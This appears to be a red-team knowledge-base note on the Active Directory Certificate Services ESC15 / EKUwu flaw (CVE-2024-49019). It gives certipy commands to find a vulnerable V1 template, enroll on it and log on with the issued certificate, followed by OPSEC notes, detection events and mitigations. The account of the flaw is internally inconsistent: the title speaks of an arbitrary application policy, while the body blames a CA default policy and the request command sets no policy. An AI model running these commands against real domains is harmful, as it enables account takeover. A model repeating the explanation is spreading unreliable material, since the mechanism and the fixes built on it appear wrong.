---
title: "ESC15 — EKUwu / CVE-2024-49019 (V1 template arbitrary application policy)"
type: concept
created: 2026-09-07
updated: 2026-09-07
tags: [active-directory, ad-cs, esc, privilege-escalation]
---

# ESC15

**EKUwu.** On a **V1 (legacy) template** that **lacks an explicit Application
Policies** extension, the **default Application Policy** is applied. If the
CA's default application policy includes the **`Client Authentication`** EKU
(`1.3.6.1.5.5.7.3.2`), then a V1 template that was never meant for logon —
e.g. an **`AnyPurpose`** or an old **`Web`**-era template — can issue
**client-auth certs** that map to the enrollee, giving **PKINIT** logon as
that account. See [[cve-2024-49019]].

The core: **V1 template + no app-policies ext + CA default includes
ClientAuth = logon-capable cert from a "safe-looking" template.**

## Exploit

```bash
# does the CA's default policy include ClientAuth, and is there a V1 template
# without an app-policies extension?
certipy find -u user@corp.local -p 'Pass' -dc-ip <DC_IP> -vulnerable -stdout

# enroll on the V1 template (it inherits the CA's default application policy)
certipy req -u user@corp.local -p 'Pass' -ca CORP-CA -template <V1_TEMPLATE>

# auth with the issued (ClientAuth) cert
certipy auth -pfx user.pfx -dc-ip <DC_IP>
```

## Red-team notes (OPSEC)

- **V1 templates are the blind spot** — most modern tooling and PKI reviews
  focus on V2 flags; a legacy template that *looks* inert (no `SAN` flag, no
  `User` purpose) can still be logon-capable via the default policy.
- **Fix order** — the clean fix is giving the V1 template an **explicit
  application policy** (so the CA default no longer applies) or moving it to
  V2 with the right flags; the CA-wide default change is riskier (affects
  every V1 template).
- Pair with [[certificate-mapping]]: the issued cert still needs to map
  (SID or weak implicit) to be usable for logon.

## Detection

- **4886/4887** for a cert on a **V1 template** whose application policy is
  the CA default and includes ClientAuth.
- CA log: issuance on a template with no explicit app-policies extension.
- **4768 PKINIT** for an account whose only certs come from a V1 template.

## Mitigations

- **Explicit application policy on every V1 template** (breaks the default
  inheritance).
- **Migrate V1 → V2** with reviewed flags.
- Remove ClientAuth from the CA **default** application policy where no V1
  template needs it.

## Links

- [[ad-cs-esc-attacks]] — ESC15 in the family
- [[cve-2024-49019]] — the CVE
- [[certificate-templates]] — V1/V2 and the application-policy extension
- [[certificate-mapping]] — the mapping the cert still needs
- [[certified-pre-owned]]
